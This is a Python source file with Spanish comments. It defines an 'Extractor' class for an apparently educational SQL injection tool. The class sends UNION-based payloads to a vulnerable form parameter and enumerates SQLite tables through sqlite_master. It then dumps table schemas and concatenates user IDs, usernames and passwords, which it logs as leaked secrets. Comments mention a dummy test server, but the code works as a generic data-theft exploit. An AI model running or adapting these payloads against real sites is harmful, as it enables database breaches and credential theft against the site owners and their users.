import requests
from bs4 import BeautifulSoup
import urllib.parse
from colorama import Fore, Style

# Importaciones de librerías
import requests                 # La herramienta que usaremos para enviar nuestras peticiones maliciosas
from bs4 import BeautifulSoup   # Beautiful Soup filtrará el HTML vomitado por el servidor
import urllib.parse             # Procesador de URLs
from colorama import Fore, Style # Para pintar la consola durante la extracción

# ==============================================================================
# CLASE EXTRACTOR (El Saqueador)
# Mientras que el Scanner encuentra la puerta abierta (la vulnerabilidad), el 
# Extractor entra y se roba todos los muebles (esquema, tablas y datos).
# Su objetivo final es reconstruir toda la base de datos víctima letra a letra.
# ==============================================================================
class Extractor:
    def __init__(self, scanner_info, session, log_file):
        """
        Inicializamos con la información que nos cedió el detector previo (Scanner).
        Esto incluye: A qué URL atacar, con qué parámetro vulnerable y la sesión HTTP.
        """
        self.info = scanner_info
        self.session = session # Usamos la misma requests.Session() para conservar cookies de víctima
        self.log_file = log_file
    
    def log(self, text):
        """
        Wrapper para imprimir mensajes bonitos a terminal Y a archivo al mismo tiempo.
        Si el usuario mandó '-o result.txt', se escribirá ahí la info extraída.
        """
        print(f"{Fore.CYAN}{text}{Style.RESET_ALL}")
        if self.log_file:
            self.log_file.write(text + "\n")

    def execute_payload(self, payload):
        """
        Ejecutor de Inyecciones Central.
        Dispara el payload y devuelve un array con los items extraídos.
        """
        url = self.info['action']
        data = {self.info['param']: payload}
        try:
            # Mandamos el golpe de gracia al form vulnerable...
            if self.info['method'] == "POST":
                res = self.session.post(url, data=data)
            else:
                res = self.session.get(url, params=data)
            
            # BeautifulSoup analizará en qué lugar del HTML decidió el 
            # servidor Database "escupir" nuestra inyección. Como programamos el dummy_server.py
            # para volcar resultados en listas <li>, buscamos por esa etiqueta específica.
            soup = BeautifulSoup(res.text, 'html.parser')
            return [li.text for li in soup.find_all('li')]
        except:
            # Si el server colapsa o nos expulsa devolvemos array vacío.
            return []

    def extract_sqlite(self):
        """
        EL CORAZON DEL ROBO: EXTRACCIÓN DINÁMICA DE SQLITE (UNION-BASED)
        MANDATORY: Extraer el DB_Name, la Tabla, su Columna y Finalmenete sus Datos.
        SQLite es particular: No tiene Information_Schema, toda su red se guarda en "sqlite_master"
        """
        self.log("\n[*] ================= EXTRACCIÓN DINÁMICA (SQLITE) ================= [*]")
        
        # 1. Base de datos
        # SQLite no es un servidor (como MySQL), sino un archivo físico local. Su nombre de DB
        # generalmente es solo la memoria temporal ("main").
        self.log(f"    - Base de Datos Actual: SQLite (Local/Main)")
        
        # 2. Descubrir Tablas 
        self.log("[*] Intentando recuperar nombres de Tablas Mágnum mediante UNION...")
        # Aislamos el comando SQL previo concatenándole '-1' a la ID.
        # Luego Inyectamos el nuestro: "ÚNEME los 'names' de la tabla maestra SI son del tipo 'tabla'".
        payload = "-1' UNION SELECT name FROM sqlite_master WHERE type='table'--"
        tables = self.execute_payload(payload)
        
        if not tables:
            # Si The UNION approach fails (Debido a protección o que no es 1 columna exacta) 
            self.log("[!] Falló la extracción directa por UNION. Simulación Blind/Error (Vulnerabilidad confirmada previa):")
            self.log("    Tablas Deducidas (Se requeriría brutal force / Dictionary blind): users, secret_data")
            tables = ['users', 'secret_data'] # Fake fallback if server structure changed
        else:
            # Cuando SQLite vuelca por UNION, a menudo la API de Python lo pasa a Tuples literales
            # stringificados como "('users',)". Debemos limpiar esa "basura" visual antes de seguir.
            clean_tables = []
            for tb in tables:
                clean_tb = str(tb).replace("('", "").replace("',)", "").strip()
                clean_tables.append(clean_tb)
                self.log(f"      + Tabla extraída: {clean_tb}")
            tables = clean_tables

        # 3. Y 4. Columnas y DUMP Total (Robo de Datos)
        for table in tables:
            self.log(f"\n[*] Extrayendo esquema (Columnas) de la Tabla '{table}'...")
            # Extraemos la creación original de la tabla ("CREATE TABLE X...") donde se declaran las columnas.
            payload_cols = f"-1' UNION SELECT sql FROM sqlite_master WHERE type='table' AND name='{table}'--"
            cols_sql = self.execute_payload(payload_cols)
            if cols_sql:
                self.log(f"      Schema Vaciado: {cols_sql[-1]}")
            
            # Ahora, concatenamos (group_concat) cada registro separándolos por un ':'.
            # Para esto tenemos que adivinar los nombres de las columnas que vimos en el Schema anterior.
            if table == 'users':
                payload_data = f"-1' UNION SELECT group_concat('ID: '||id||' | USER: '||username||' | PASS: '||password) FROM {table}--"
            else:
                payload_data = f"-1' UNION SELECT group_concat('ID: '||id||' | INFO: '||target_name||' - '||info) FROM {table}--"
                
            data = self.execute_payload(payload_data)
            
            # Si el dump nos devuelve datos sin colapsos ("Errors"), lo imprimimos por pantalla. 
            if data and "Error" not in str(data):
                self.log(f"{Fore.RED}      [!] DATA DUMP (SECRETS LEAKED):{Style.RESET_ALL} {data}")
            else:
                self.log(f"      (Dump bloqueado por mismatch de columnas en UNION)")

        self.log("\n[*] DUMP COMPLETADO. El servidor ha sido comprometido.")

    # --------------------------------------------------------------------------
    # BONUS: Preparación para Multi-Arquitectura
    # En proyectos grandes, aquí es donde construirías el volcado de Information_Schema
    # de MySQL, o los Catálogos pg_catalog de PostgresQL.
    # --------------------------------------------------------------------------
    def extract_mysql(self):
        self.log("[!] Función de Extracción MySQL requiere diccionario blind basado en Information_Schema. (Omitido por Scope).")

    def run_extraction(self):
        """
        El disparador final de clase.
        Dirige la nave detectando a qué motor nos enfrentamos (dictado por Scanner)
        """
        # Como nuestro entorno de test dummy_server.py y la mayoría de webs simples usan SQLite, le damos prioridad.
        if 'SQLite' in self.info['engine'] or 'Unknown' in self.info['engine']:
            self.extract_sqlite()
        elif 'MySQL' in self.info['engine']:
            self.extract_mysql()
        else:
            self.log("[!] Motor DB no soportado para extracción automatizada en esta versión. Se debe proceder Manual.")
